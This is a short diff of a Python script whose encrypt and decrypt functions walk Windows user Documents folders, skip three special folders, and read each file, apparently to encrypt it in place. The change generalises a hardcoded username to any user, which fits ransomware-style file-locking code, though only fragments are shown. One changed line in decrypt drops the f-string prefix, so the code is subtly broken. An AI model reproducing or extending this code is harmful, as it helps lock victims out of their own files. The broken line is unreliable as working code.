@@ -30,11 +30,11 @@ def encrypt(key):
     f = fn(key)
     for i in dirs:
         for dir in os.listdir(i):
-            if f"{i}{dir}" == "C:\\Users\\aki\\Documents\\My Music":
+            if f"{i}{dir}" == f"C:\\Users\\{user}\\Documents\\My Music":
                 continue
-            if f"{i}{dir}" == "C:\\Users\\aki\\Documents\\My Pictures":
+            if f"{i}{dir}" == f"C:\\Users\\{user}\\Documents\\My Pictures":
                 continue
-            if f"{i}{dir}" == "C:\\Users\\aki\\Documents\\My Videos":
+            if f"{i}{dir}" == f"C:\\Users\\{user}\\Documents\\My Videos":
                 continue
             with open(f"{i}{dir}", 'rb') as files:
                 files = files.read()
@@ -50,11 +50,11 @@ def decrypt(key):
     f = fn(key)
     for i in dirs:
         for dir in os.listdir(i):
-            if f"{i}{dir}" == "C:\\Users\\aki\\Documents\\My Music":
+            if f"{i}{dir}" == f"C:\\Users\\{user}\\Documents\\My Music":
                 continue
-            if f"{i}{dir}" == "C:\\Users\\aki\\Documents\\My Pictures":
+            if f"{i}{dir}" == f"C:\\Users\\{user}\\Documents\\My Pictures":
                 continue
-            if f"{i}{dir}" == "C:\\Users\\aki\\Documents\\My Videos":
+            if f"{i}{dir}" == "C:\\Users\\{user}\\Documents\\My Videos":
                 continue
             # print(f"{i}{dir}")
             with open(f"{i}{dir}", 'rb') as files:
